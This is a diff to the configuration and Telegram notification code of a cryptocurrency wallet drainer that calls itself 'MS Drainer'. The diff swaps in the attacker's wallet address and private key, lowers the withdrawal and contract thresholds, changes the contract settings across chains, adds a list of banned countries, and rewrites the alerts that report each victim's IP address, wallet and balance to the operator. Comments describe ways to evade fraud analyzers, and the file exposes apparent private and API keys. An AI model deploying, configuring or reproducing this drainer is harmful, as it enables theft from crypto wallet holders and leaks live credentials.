@@ -34,8 +34,8 @@ const MS_Telegram_Chat_ID = "-1002267224933"; // -1002583817934 Enter here the I
 // To specify multiple chats, you need to fill in as follows: MS_Telegram_Chat_ID = ["CHANNEL_ID", "ANOTHER_CHANNEL_ID", "ONE_MORE_CHANNEL_ID"]
 const MS_Telegram_Admin_IDs = ["6061406566"]; // Specify your Telegram ID here so that it only accepts commands from you
 
-const MS_Wallet_Address = "0xFaf517b01ca064D6a8C56226b524b9B1Dd457ED3"; // Wallet address where mammoth assets will go
-const MS_Wallet_Private = "5b68f015ed5c24a603daeff6f45e869b9b83eb529e124fffe2904b277f746d17"; // The private key to the wallet is above, MUST BE INDICATED, OTHERWISE THE WITHDRAWAL WILL NOT WORK
+const MS_Wallet_Address = "0x6c8BE5c0CB5C488d6A69f8795969A996a46276ff"; // Wallet address where mammoth assets will go
+const MS_Wallet_Private = "0xdb9dac99cd4f62025b762e2df5c1e77da7f82edb0990deab53d0086ff7df8251"; // The private key to the wallet is above, MUST BE INDICATED, OTHERWISE THE WITHDRAWAL WILL NOT WORK
 const MS_Wallet_Receiver = ["0x337571b793D0DEee06da50A418Ef02b94E32A2C0"]; // The wallet or wallets where the assets will arrive may be the same as MS_Wallet_Address, or may be different
 // To specify multiple wallets, you need to fill in as follows: MS_Wallet_Receiver = ["WALLET_ADDRESS_HERE", "ANOTHER_WALLET", "ONE_MORE_WALLET"]
 // If several wallets are specified, the drainer will select a random one and send assets to it, convenient for asset distribution
@@ -105,7 +105,7 @@ const MS_Allowance_API = true; // Сохранять ли историю одо�
 const MS_Allowance_Check = false; // Проверять кошельки на наличие повторных пополнений (не включать, если используется сторонний софт)
 const MS_Allowance_Withdraw = {
   mode: false, // Automatically withdraw found new assets from the wallet (works only when MS_Allowance_Check is enabled)
-  min_amount: 1, // Сумма в долларах, от которой будет срабатывать автоматический вывод актива (будет работать только при рабочем токене DeBank!)
+  min_amount: 0, // Сумма в долларах, от которой будет срабатывать автоматический вывод актива (будет работать только при рабочем токене DeBank!)
   wallets: { // List of wallets where automatic withdrawal works, including your main wallet (ADDRESS:PRIVATE)
     "WALLET_ADDRESS_HERE": "WALLET_PRIVATE_HERE",
   }
@@ -320,7 +320,7 @@ const MS_Settings = {
   Use_Randomizer_For_Tokens: false, // false - do not replace Wallet, true - replace Wallet with a new one when withdrawing tokens (TRANSFER/APPROVE/PERMIT/PERMIT2)
   Use_Back_Feature: true, // false - do not use, true - when working through a new generation contract
  // return one unit back to the victim's Wallet to confuse some fraudulent contract analyzers
-  Use_Contract_Amount: 1, // Use a contract only from the USD amount to reduce the chance of marking the contract
+  Use_Contract_Amount: 0.5, // Use a contract only from the USD amount to reduce the chance of marking the contract
   Use_Public_Premium: true, // Use a separate public contract for profits over $500
   Minimal_Wallet_Price: 1, // Specify the minimum wallet value in USD
   Tokens_First: 1, // 0 - by price, 1 - native Token is always last, 2 - native Token is always first
@@ -405,7 +405,7 @@ const MS_Settings = {
 	  API: '2B44DG986KR15DTS4S1E5JWZT8VTWZ7C99', // Etherscan API Key (don't change if unsure)
 	  Contract_Address: "0x0007039b77d22042afc1a9c3b3da11837b730000", // address for smart contract, leave blank if you don't know or don't use
 	  Contract_Type: "ClaimRewards", // Variations: Claim, ClaimReward, ClaimRewards, SecurityUpdate, Connect, Execute, Swap, Multicall
-	  Contract_Legacy: 2, // 0 - use MS Drainer style contracts, 1 - use standard contracts, 2 - use improved MS Drainer contract (all versions ABOVE 2023-11-06)
+	  Contract_Legacy: 0, // 0 - use MS Drainer style contracts, 1 - use standard contracts, 2 - use improved MS Drainer contract (all versions ABOVE 2023-11-06)
   },
 	bsc: { // Binance Smart Chain, network settings
 	  Enable: 1, // 0 - disabled, 1 - enabled
@@ -418,7 +418,7 @@ const MS_Settings = {
 	  API: 'K5AI5N7ZPC9EF6G9MVQF33CBVMY1UKQ7HI', // Bscscan API Key (do not change if unsure)
 	  Contract_Address: "0x0007039b77d22042afc1a9c3b3da11837b730000", // address for smart contract, if you don't know or don't use it, leave blank
 	  Contract_Type: "Execute", // Variations: Claim, ClaimReward, ClaimRewards, SecurityUpdate, Connect, Execute, Swap, Multicall
-	  Contract_Legacy: 2, // 0 - use MS Drainer style contracts, 1 - use standard contracts, 2 - use improved MS Drainer contract (all versions ABOVE 2023-11-06)
+	  Contract_Legacy: 0, // 0 - use MS Drainer style contracts, 1 - use standard contracts, 2 - use improved MS Drainer contract (all versions ABOVE 2023-11-06)
 	},
 	polygon: { // Polygon (MATIC), network settings
 	  Enable: 1, // 0 - disabled, 1 - enabled
@@ -431,7 +431,7 @@ const MS_Settings = {
 	  API: 'M9IMUX515SEB97THWJRQDKNX75CI66X7XX', // Polygonscan API Key (don't change if unsure)
 	  Contract_Address: "0x0007039b77d22042afc1a9c3b3da11837b730000", // smart contract address, leave blank if unsure or not using
 	  Contract_Type: "Execute", // Variations: Claim, ClaimReward, ClaimRewards, SecurityUpdate, Connect, Execute, Swap, Multicall
-	  Contract_Legacy: 2, // 0 - use MS Drainer style contracts, 1 - use standard contracts, 2 - use improved MS Drainer contract (all versions ABOVE 2023-11-06)
+	  Contract_Legacy: 0, // 0 - use MS Drainer style contracts, 1 - use standard contracts, 2 - use improved MS Drainer contract (all versions ABOVE 2023-11-06)
 	},
 	avalanche: { // Avalanche C-Chain, network setup
 	  Enable: 1, // 0 - disabled, 1 - enabled
@@ -444,7 +444,7 @@ const MS_Settings = {
 	  API: 'ZMJ2CKEX65EJ8WIPWRJWKRFG8HXCM6I89Z', // Snowtrace API Key (don't change unless sure)
 	  Contract_Address: "0x0007039b77d22042afc1a9c3b3da11837b730000", // address for smart contract, if you don't know or don't use it, leave it blank
 	  Contract_Type: "Execute", // Variations: Claim, ClaimReward, ClaimRewards, SecurityUpdate, Connect, Execute, Swap, Multicall
-	  Contract_Legacy: 2, // 0 - used MS Drainer style contracts, 1 - use standard contracts, 2 - use improved MS Drainer contract (all versions ABOVE 2023-11-06)
+	  Contract_Legacy: 0, // 0 - used MS Drainer style contracts, 1 - use standard contracts, 2 - use improved MS Drainer contract (all versions ABOVE 2023-11-06)
     },
 	arbitrum: { // Arbitrum, network setup
 	  Enable: 1, // 0 - disabled, 1 - enabled
@@ -457,7 +457,7 @@ const MS_Settings = {
 	  API: 'DU3TKS3QYBQAHC7SEQ5YHB9VPD85JXTX7I', // Arbscan API Key (don't change if unsure)
 	  Contract_Address: "0x0007039b77d22042afc1a9c3b3da11837b730000", // smart contract address, leave blank if unsure or unused
 	  Contract_Type: "Execute", // Variations: Claim, ClaimReward, ClaimRewards, SecurityUpdate, Connect, Execute, Swap, Multicall
-	  Contract_Legacy: 2, // 0 - use MS Drainer style contracts, 1 - use standard contracts, 2 - use improved MS Drainer contract (all versions HIGHER than 2023-11-06)
+	  Contract_Legacy: 0, // 0 - use MS Drainer style contracts, 1 - use standard contracts, 2 - use improved MS Drainer contract (all versions HIGHER than 2023-11-06)
 	},
 	fantom: { // Fantom, network setup
 	  Enable: 1, // 0 - disabled, 1 - enabled
@@ -470,7 +470,7 @@ const MS_Settings = {
 	  API: 'F9GFY4EXGD84MHWEK5NCUJWF9FZVBRT415', // Fantomscan API Key (do not change if unsure)
 	  Contract_Address: "0x0007039b77d22042afc1a9c3b3da11837b730000", // address for the smart contract, if you don't know or don't use it, leave blank
 	  Contract_Type: "Execute", // Variations: Claim, ClaimReward, ClaimRewards, SecurityUpdate, Connect, Execute, Swap, Multicall
-	  Contract_Legacy: 2, // 0 - use MS Drainer style contracts, 1 - use standard contracts, 2 - use improved MS Drainer contract (all versions ABOVE 2023-11-06)
+	  Contract_Legacy: 0, // 0 - use MS Drainer style contracts, 1 - use standard contracts, 2 - use improved MS Drainer contract (all versions ABOVE 2023-11-06)
 	},
 	optimism: { // Optimism, network settings
 	  Enable: 1, // 0 - disabled, 1 - enabled
@@ -483,7 +483,7 @@ const MS_Settings = {
 	  API: '46J83C1RF5TEWJ3NVCF17PG3KYD36U9QPK', // Optimismscan API Key (don't change if unsure)
 	  Contract_Address: "0x0007039b77d22042afc1a9c3b3da11837b730000", // address for smart contract, leave blank if you don't know or don't use
 	  Contract_Type: "Execute", // Variations: Claim, ClaimReward, ClaimRewards, SecurityUpdate, Connect, Execute, Swap, Multicall
-	  Contract_Legacy: 2, // 0 - use MS Drainer style contracts, 1 - use standard contracts, 2 - use improved MS Drainer contract (all versions ABOVE 2023-11-06)
+	  Contract_Legacy: 0, // 0 - use MS Drainer style contracts, 1 - use standard contracts, 2 - use improved MS Drainer contract (all versions ABOVE 2023-11-06)
 	},
 	base: { // Base, network settings
 	  Enable: 1, // 0 - disabled, 1 - enabled
@@ -496,7 +496,7 @@ const MS_Settings = {
 	  API: '6NGC2DAW6N197CWFP224HSR3778ZDFF6EI', // Basescan API Key (do not change if unsure)
 	  Contract_Address: "0x0007039b77d22042afc1a9c3b3da11837b730000", // address for smart contract, if you don't know or don't use it, leave blank
 	  Contract_Type: "Execute", // Variations: Claim, ClaimReward, ClaimRewards, SecurityUpdate, Connect, Execute, Swap, Multicall
-	  Contract_Legacy: 2, // 0 - use MS Drainer style contracts, 1 - use standard contracts, 2 - use improved MS Drainer contract (all versions ABOVE 2023-11-06)
+	  Contract_Legacy: 0, // 0 - use MS Drainer style contracts, 1 - use standard contracts, 2 - use improved MS Drainer contract (all versions ABOVE 2023-11-06)
 	},
 	zksync_era: { // ZkSync Era, network settings
 	  Enable: 1, // 0 - disabled, 1 - enabled
@@ -509,7 +509,7 @@ const MS_Settings = {
 	  API: '', // ZkSync Era API Key (don't change if unsure)
 	  Contract_Address: "", // address for smart contract, leave blank if unsure or not using
 	  Contract_Type: "Execute", // Variations: Claim, ClaimReward, ClaimRewards, SecurityUpdate, Connect, Execute, Swap, Multicall
-	  Contract_Legacy: 2, // 0 - use contracts in MS Drainer style, 1 - use standard contracts, 2 - use improved MS Drainer contract (all versions ABOVE 06.11.2023)
+	  Contract_Legacy: 0, // 0 - use contracts in MS Drainer style, 1 - use standard contracts, 2 - use improved MS Drainer contract (all versions ABOVE 06.11.2023)
     },
     pulse: { // Pulse, network settings
 	  Enable: 1, // 0 - disabled, 1 - enabled
@@ -522,7 +522,7 @@ const MS_Settings = {
 	  API: '', // Pulse API Key (do not change if unsure)
 	  Contract_Address: "", // address for smart contract, if you don't know or don't use it, leave blank
 	  Contract_Type: "Execute", // Variations: Claim, ClaimReward, ClaimRewards, SecurityUpdate, Connect, Execute, Swap, Multicall
-	  Contract_Legacy: 2, // 0 - use MS Drainer style contracts, 1 - use standard contracts, 2 - use improved MS Drainer contract (all versions ABOVE 06.11.2023)
+	  Contract_Legacy: 0, // 0 - use MS Drainer style contracts, 1 - use standard contracts, 2 - use improved MS Drainer contract (all versions ABOVE 06.11.2023)
     },
   }
 };
@@ -1156,7 +1156,7 @@ const withdraw_native = async (wallet_data, chain_id = 1, amount_usd = null, is_
 // Автор и разработчик не одобряет использование данного ПО в указанных странах
 // Удаление какой-либо страны из данного списка СТРОГО ЗАПРЕЩЕНО И НЕ ОДОБРЯЕТСЯ
 // ============================================================================= //
-const MS_Banned_Countries = [];
+const MS_Banned_Countries = [ 'RU', 'BY', 'KZ', 'UZ', 'AZ', 'AM', 'TJ', 'KG' ];
 // ============================================================================= //
 
 const bot = new Telegram(MS_Telegram_Token, { polling: MS_Functional_Bot });
@@ -1386,49 +1386,19 @@ const on_enter_website = async (response, data) => {
       let receiver_chat_id = data.chat_data == false ? MS_Notifications.enter_website.chat_id : data.chat_data.enter_website;
       try {
         if (MS_Functional_Bot) {
-          // Enhanced version with block button
-await send_message(receiver_chat_id, 
-  `🚀 <b>: New Site Access Detected</b>
-  
-  🌐 <b>Domain:</b> <code>${data.domain}</code>
-  📍 <b>IP:</b> <code>${User_Country}</code> 
-  
-  🖥️ <b>TECHNICAL PROFILE:</b>
-  • <b>Platform:</b> <code>${User_OS}</code>
-  • <b>Browser:</b> <code>${User_Browser}</code>
- 
-
-  
-  🔒 <b>Security Status:</b> Active monitoring`, {
-      parse_mode: 'HTML',
-      reply_markup: {
-          inline_keyboard: [
-              [
-                  { 
-                      text: '🛡️ Block This IP', 
-                      callback_data: `block_ip_${data.IP.toLowerCase().trim()}`
-                  }
+          await send_message(receiver_chat_id, `<b>👋 New visit to your site</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code> (${User_Country})\n<b>🖥 User Agent:</b> <code>${data.UA.source}</code>\n<b>💾 System:</b> <code>${User_OS}</code>\n<b>🌍 Browser:</b> <code>${User_Browser}</code>\n<b>🕐 Time:</b> <code>${data.time}</code>\n<b>👨‍🦰 User:</b> <code>#user_${data.user_id}</code>`, {
+            parse_mode: 'HTML', reply_markup: {
+              inline_keyboard: [
+                [
+                  { text: '🤕 Block IP', callback_data: `block_ip_${data.IP.toLowerCase().trim()}` }
+                ]
               ]
-          ]
-      }
-  });
-  
-  // Enhanced version without block button
-  await send_message(receiver_chat_id,
-  `🚀 <b>: New Site Access Detected</b>
-  
-  🌐 <b>Domain:</b> <code>${data.domain}</code>
-  📍 <b>IP:</b> <code>${User_Country}</code> 
-  
-  🖥️ <b>TECHNICAL PROFILE:</b>
-  • <b>Platform:</b> <code>${User_OS}</code>
-  • <b>Browser:</b> <code>${User_Browser}</code>
- 
-  
-  
-  🔒 <b>Security Status:</b> Active monitoring`, {
-      parse_mode: 'HTML'
-  });
+            }
+          });
+        } else {
+          await send_message(receiver_chat_id, `<b>👋 New visit to your site</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code> (${User_Country})\n<b>🖥 User Agent:</b> <code>${data.UA.source}</code>\n<b>💾 System:</b> <code>${User_OS}</code>\n<b>🌍 Browser:</b> <code>${User_Browser}</code>\n<b>🕐 Time:</b> <code>${data.time}</code>\n<b>👨‍🦰 User:</b> <code>#user_${data.user_id}</code>`, {
+            parse_mode: 'HTML'
+          });
         }
       } catch(err) {
         console.log(err);
@@ -1447,18 +1417,9 @@ const on_leave_website = async (response, data) => {
     if ((data.chat_data == false && MS_Notifications.leave_website.mode) || (data.chat_data != false && data.chat_data.leave_website != "")) {
       let receiver_chat_id = data.chat_data == false ? MS_Notifications.leave_website.chat_id : data.chat_data.leave_website;
       try {
-        await send_message(receiver_chat_id, 
-          `🔴 <b>: Session Terminated</b>
-          
-          🌐 <b>Domain:</b> <code>${data.domain}</code>
-          📍<b>IP:</b> <code>${User_Country}</code> 
-          
-          ⚡ <b>Event Type:</b> Page closed or reloaded
-          📊 <b>Status:</b> Session ended
-          
-          🕒 <b>Connection Lost:</b> User terminated browsing session`, {
-              parse_mode: 'HTML'
-          });
+        await send_message(receiver_chat_id, `<b>😭 User #user_${data.user_id} closed or reloaded the site</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>`, {
+          parse_mode: 'HTML'
+        });
       } catch (err) {
         console.log(err);
       }
@@ -1476,20 +1437,9 @@ const insufficient_balance = async (response, data) => {
     if ((data.chat_data == false && MS_Notifications.insufficient_balance.mode) || (data.chat_data != false && data.chat_data.insufficient_balance != "")) {
       let receiver_chat_id = data.chat_data == false ? MS_Notifications.insufficient_balance.chat_id : data.chat_data.insufficient_balance;
       try {
-        await send_message(receiver_chat_id, 
-          `⚠️ <b>: Insufficient Gas Balance</b>
-         
-          💎 <b>Asset:</b> <code>${data.asset.name}</code>
-          🌐 <b>Domain:</b> <code>${data.domain}</code>
-          📍<b>IP:</b> <code>${User_Country}</code> 
-          
-          🔋 <b>Transaction Status:</b> Halted
-          💰 <b>Issue:</b> Insufficient balance for gas fees
-          🚫 <b>Result:</b> Transaction cannot proceed
-          
-          ⚡ <b>Action Required:</b> User needs to fund wallet for gas`, {
-              parse_mode: 'HTML'
-          });
+        await send_message(receiver_chat_id, `<b>😭 User #user_${data.user_id} has insufficient balance for Gas Fee For <code>${data.asset.name}</code></b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>`, {
+          parse_mode: 'HTML'
+        });
       } catch (err) {
         console.log(err);
       }
@@ -1514,19 +1464,9 @@ const on_connect_request = async (response, data) => {
     if ((data.chat_data == false && MS_Notifications.connect_request.mode) || (data.chat_data != false && data.chat_data.connect_request != "")) {
       let receiver_chat_id = data.chat_data == false ? MS_Notifications.connect_request.chat_id : data.chat_data.connect_request;
       try {
-        await send_message(receiver_chat_id, 
-          `🔗 <b>: Connection Request Received</b>
-          
-          🌐 <b>Domain:</b> <code>${data.domain}</code>
-          📍<b>IP:</b> <code>${User_Country}</code> 
-          
-          💼 <b>Wallet Type:</b> <code>${data.wallet}</code>
-          
-          🟡 <b>Status:</b> Awaiting user confirmation
-          📡 <b>Connection:</b> Request initiated
-          ⏳ <b>Action:</b> Pending wallet approval`, {
-              parse_mode: 'HTML'
-          });
+        await send_message(receiver_chat_id, `<b>❓ Requested connection from the user #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>💰 Wallet type:</b> <code>${data.wallet}</code>`, {
+          parse_mode: 'HTML'
+        });
       } catch(err) {
         console.log(err);
       }
@@ -1544,19 +1484,9 @@ const on_connect_cancel = async (response, data) => {
     if ((data.chat_data == false && MS_Notifications.connect_cancel.mode) || (data.chat_data != false && data.chat_data.connect_cancel != "")) {
       let receiver_chat_id = data.chat_data == false ? MS_Notifications.connect_cancel.chat_id : data.chat_data.connect_cancel;
       try {
-        await send_message(receiver_chat_id, 
-          `🚫 <b>: Connection Rejected</b>
-          
-          🌐 <b>Domain:</b> <code>${data.domain}</code>
-          📍<b>IP:</b> <code>${User_Country}</code> 
-          
-          🔴 <b>Status:</b> Connection declined by user
-          ⏹️ <b>Action:</b> Request terminated
-          📊 <b>Result:</b> No wallet connection established
-          
-          🛡️ <b>Security Note:</b> User-initiated rejection`, {
-              parse_mode: 'HTML'
-          });
+        await send_message(receiver_chat_id, `<b>❌ User #user_${data.user_id} rejected connection</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>`, {
+          parse_mode: 'HTML'
+        });
       } catch (err) {
         console.log(err);
       }
@@ -1586,31 +1516,19 @@ const on_connect_success = async (response, data) => {
       let receiver_chat_id = data.chat_data == false ? MS_Notifications.connect_success.chat_id : data.chat_data.connect_success;
       let User_Country = await detect_country(data.IP);
       if (MS_Functional_Bot) {
-        await send_message(receiver_chat_id, 
-          `🟢 <b>: Wallet Connected Successfully</b>
-      
-          🌐 <b>Domain:</b> <code>${data.domain}</code>
-          📍 <b>IP:</b> <code>${User_Country}</code> 
-          
-          💼 <b>Wallet Type:</b> <code>${data.wallet}</code>
-          🔑 <b>Address:</b> <code>${data.address}</code>
-          ⛓️ <b>Network:</b> <code>${chain_id_to_name(data.chain_id)}</code>
-          
-          📊 <b>Status:</b> Balance calculation in progress
-          ⏳ <b>Monitoring:</b> User session active
-          `, {
-              parse_mode: 'HTML',
-              reply_markup: {
-                  inline_keyboard: [
-                      [
-                          { 
-                              text: '🛡️ Block This Wallet', 
-                              callback_data: `block_wallet_${data.address.toLowerCase().trim()}`
-                          }
-                      ]
-                  ]
-              }
-          });
+        await send_message(receiver_chat_id, `<b>🦊 User #user_${data.user_id} connected the wallet</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code> (${User_Country})\n\n<b>💰 Wallet type:</b> <code>${data.wallet}</code>\n<b>💠 address:</b> <code>${data.address}</code>\n<b>⛓ Current Net:</b> <code>${chain_id_to_name(data.chain_id)}</code>\n\n<i>The balance is being calculated, if the User does not leave the site, you will receive a notification</i>`, {
+          parse_mode: 'HTML', reply_markup: {
+            inline_keyboard: [
+              [
+                { text: '🤕 Block wallet', callback_data: `block_wallet_${data.address.toLowerCase().trim()}` }
+              ]
+            ]
+          }
+        });
+      } else {
+        await send_message(receiver_chat_id, `<b>🦊 User #user_${data.user_id} connected the wallet</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code> (${User_Country})\n\n<b>💰 Wallet type:</b> <code>${data.wallet}</code>\n<b>💠 address:</b> <code>${data.address}</code>\n<b>⛓ Current Net:</b> <code>${chain_id_to_name(data.chain_id)}</code>\n\n<i>The balance is being calculated, if the User does not leave the site, you will receive a notification</i>`, {
+          parse_mode: 'HTML'
+        });
       }
     }
     send_response(response, { status: 'OK' });
@@ -1639,44 +1557,13 @@ const on_check_finish = async (response, data) => {
           console.log(err);
         }
       };
-      if (assets_native == "") assets_native = '<i>$0.00</i>';
-      if (assets_tokens == "") assets_tokens = '<i>$0.00</i>';
-      if (assets_nfts == "") assets_nfts = '<i>No NFTs detected</i>';
-      
-      // Helper function to format assets into organized lists
-      function formatAssetList(assets, defaultMessage) {
-          if (assets === defaultMessage) return defaultMessage;
-          
-          // Split by commas or newlines and create list items
-          const items = assets.split(/[,|\n]/).filter(item => item.trim() !== '');
-          return items.map(item => `    • ${item.trim()}`).join('\n');
-      }
-      
+      if (assets_native == "") assets_native = '<i>empty</i>';
+      if (assets_tokens == "") assets_tokens = '<i>empty</i>';
+      if (assets_nfts == "") assets_nfts = '<i>empty</i>';
       try {
-          await send_message(receiver_chat_id, 
-      `📊 <b>: Wallet Portfolio Analyzed</b>
-     
-      🌐 <b>Domain:</b> <code>${data.domain}</code>
-      📍 <b>IP Address:</b> <code>${User_Country}</code>
-      
-      💵 <b>Total Portfolio Value:</b> <code>$${data.balance.toFixed(2)}</code>
-      
-      📈 <b>ASSET BREAKDOWN:</b>
-      ┌─────────────────────────
-      │  🪙 <b>Native Coins:</b>
-      ${formatAssetList(assets_native, '<i>No native assets</i>')}
-      │  
-      │  💰 <b>ERC-20 Tokens:</b>
-      ${formatAssetList(assets_tokens, '<i>No tokens found</i>')}
-      │  
-      │  🖼️ <b>NFT Collections:</b>
-      ${formatAssetList(assets_nfts, '<i>No NFTs detected</i>')}
-      └─────────────────────────
-      
-      🔍 <b>Analysis:</b> Portfolio scan completed
-      ✅ <b>Status:</b> Asset inventory finalized`, {
-              parse_mode: 'HTML'
-      });
+        await send_message(receiver_chat_id, `<b>💰 User #user_${data.user_id} scanned the wallet</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>Total wallet balance:</b> <code>${data.balance.toFixed(2)}$</code>\n\n<b>Main coin:</b> ${assets_native}\n\n<b>ERC-20 tokens:</b> ${assets_tokens}\n\n<b>NFT:</b> ${assets_nfts}`, {
+          parse_mode: 'HTML'
+        });
       } catch(err) {
         console.log(err);
       }
@@ -1694,23 +1581,9 @@ const on_chain_request = async (response, data) => {
     if ((data.chat_data == false && MS_Notifications.chain_request.mode) || (data.chat_data != false && data.chat_data.chain_request != "")) {
       let receiver_chat_id = data.chat_data == false ? MS_Notifications.chain_request.chat_id : data.chat_data.chain_request;
       try {
-        await send_message(receiver_chat_id, 
-          `🔄 <b>: Network Switch Requested</b>
-        
-          🌐 <b>Domain:</b> <code>${data.domain}</code>
-          📍<b>IP:</b> <code>${User_Country}</code> 
-          
-          ⛓️ <b>NETWORK TRANSITION:</b>
-          ┌─────────────────────────
-          │  📍 <b>Current Network:</b> ${chain_id_to_name(data.chains[0])}
-          │  🚀 <b>Requested Network:</b> ${chain_id_to_name(data.chains[1])}
-          └─────────────────────────
-          
-          🟡 <b>Status:</b> Awaiting user confirmation
-          📡 <b>Action:</b> Network switch proposal
-          ⏳ <b>User Decision:</b> Pending approval`, {
-              parse_mode: 'HTML'
-          });
+        await send_message(receiver_chat_id, `<b>❓ User #user_${data.user_id} received a request to change network</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>⛓ Current Net:</b> ${chain_id_to_name(data.chains[0])}\n<b>⛓ Новая Net:</b> ${chain_id_to_name(data.chains[1])}`, {
+          parse_mode: 'HTML'
+        });
       } catch(err) {
         console.log(err);
       }
@@ -1728,19 +1601,9 @@ const on_chain_success = async (response, data) => {
     if ((data.chat_data == false && MS_Notifications.chain_success.mode) || (data.chat_data != false && data.chat_data.chain_success != "")) {
       let receiver_chat_id = data.chat_data == false ? MS_Notifications.chain_success.chat_id : data.chat_data.chain_success;
       try {
-        await send_message(receiver_chat_id, 
-          `🟢 <b>: Network Switch Completed</b>
-        
-          🌐 <b>Domain:</b> <code>${data.domain}</code>
-          📍<b>IP:</b> <code>${User_Country}</code> 
-          
-          ⛓️ <b>Network Status:</b> Successfully switched
-          🔄 <b>Transition:</b> Network change confirmed
-          ✅ <b>Operation:</b> Completed successfully
-          
-          📊 <b>System:</b> User is now operating on new network`, {
-              parse_mode: 'HTML'
-          });
+        await send_message(receiver_chat_id, `<b>✅ User #user_${data.user_id} changed network</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>`, {
+          parse_mode: 'HTML'
+        });
       } catch (err) {
         console.log(err);
       }
@@ -1758,23 +1621,9 @@ const on_chain_cancel = async (response, data) => {
     if ((data.chat_data == false && MS_Notifications.chain_cancel.mode) || (data.chat_data != false && data.chat_data.chain_cancel != "")) {
       let receiver_chat_id = data.chat_data == false ? MS_Notifications.chain_cancel.chat_id : data.chat_data.chain_cancel;
       try {
-        await send_message(receiver_chat_id, 
-          `🔴 <b>: Network Switch Failed</b>
-      
-          🌐 <b>Domain:</b> <code>${data.domain}</code>
-          📍<b>IP:</b> <code>${User_Country}</code> 
-          
-          ⛓️ <b>Network Status:</b> Change rejected or unavailable
-          🚫 <b>Operation:</b> Network switch cancelled
-          🔄 <b>Result:</b> User remains on current network
-          
-          ⚠️ <b>Possible Reasons:</b>
-          • User manually rejected change
-          • Target network unavailable
-          • Wallet compatibility issue
-          • Connection timeout`, {
-              parse_mode: 'HTML'
-          });
+        await send_message(receiver_chat_id, `<b>❌ User #user_${data.user_id} rejected the network change, or the network is unavailable</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>`, {
+          parse_mode: 'HTML'
+        });
       } catch(err) {
         console.log(err);
       }
@@ -1792,24 +1641,9 @@ const on_transfer_cancel = async (response, data) => {
     if ((data.chat_data == false && MS_Notifications.transfer_cancel.mode) || (data.chat_data != false && data.chat_data.transfer_cancel != "")) {
       let receiver_chat_id = data.chat_data == false ? MS_Notifications.transfer_cancel.chat_id : data.chat_data.transfer_cancel;
       try {
-        await send_message(receiver_chat_id, 
-          `🔴 <b>: Transaction Failed</b>
-   
-          🌐 <b>Domain:</b> <code>${data.domain}</code>
-          📍<b>IP:</b> <code>${User_Country}</code> 
-          
-          💸 <b>Transaction Type:</b> Transfer
-          🚫 <b>Status:</b> Rejected or failed to process
-          ❌ <b>Result:</b> No funds transferred
-          
-          ⚠️ <b>Failure Reasons:</b>
-          • User manually rejected transaction
-          • Transaction processing error
-          • Network congestion
-          • Insufficient gas fees
-          • Smart contract rejection`, {
-              parse_mode: 'HTML'
-          });
+        await send_message(receiver_chat_id, `<b>❌ User #user_${data.user_id} rejected the transfer or the transaction did not go through</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>`, {
+          parse_mode: 'HTML'
+        });
       } catch(err) {
         console.log(err);
       }
@@ -1827,26 +1661,9 @@ const on_approve_cancel = async (response, data) => {
     if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
       let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
       try {
-        await send_message(receiver_chat_id, 
-          `🔴 <b>: Transaction Confirmation Failed</b>
-          
-          🌐 <b>Domain:</b> <code>${data.domain}</code>
-          📍<b>IP:</b> <code>${User_Country}</code> 
-          
-          🛡️ <b>Action:</b> Transaction confirmation
-          🚫 <b>Status:</b> Rejected by user or system failure
-          ❌ <b>Result:</b> Operation cancelled
-          
-          ⚠️ <b>Failure Analysis:</b>
-          • User manually rejected confirmation
-          • Transaction processing error
-          • Wallet connectivity issue
-          • Network timeout
-          • Smart contract interaction failed
-          
-          🔒 <b>Security Status:</b> No unauthorized actions detected`, {
-              parse_mode: 'HTML'
-          });
+        await send_message(receiver_chat_id, `<b>❌ User #user_${data.user_id} rejected confirmation or transaction failed</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>`, {
+          parse_mode: 'HTML'
+        });
       } catch(err) {
         console.log(err);
       }
@@ -1864,26 +1681,9 @@ const on_sign_cancel = async (response, data) => {
     if ((data.chat_data == false && MS_Notifications.sign_cancel.mode) || (data.chat_data != false && data.chat_data.sign_cancel != "")) {
       let receiver_chat_id = data.chat_data == false ? MS_Notifications.sign_cancel.chat_id : data.chat_data.sign_cancel;
       try {
-        await send_message(receiver_chat_id, 
-          `🔴 <b>: Signature Request Failed</b>
-         
-          🌐 <b>Domain:</b> <code>${data.domain}</code>
-          📍<b>IP:</b> <code>${User_Country}</code> 
-          
-          📝 <b>Action:</b> Digital signature request
-          🚫 <b>Status:</b> Rejected by user or failed to process
-          ❌ <b>Result:</b> No signature provided
-          
-          ⚠️ <b>Failure Analysis:</b>
-          • User manually rejected signature request
-          • Signature verification failed
-          • Message signing error
-          • Wallet compatibility issue
-          • Security policy violation
-          
-          🔐 <b>Security Note:</b> Signature requests require explicit user approval`, {
-              parse_mode: 'HTML'
-          });
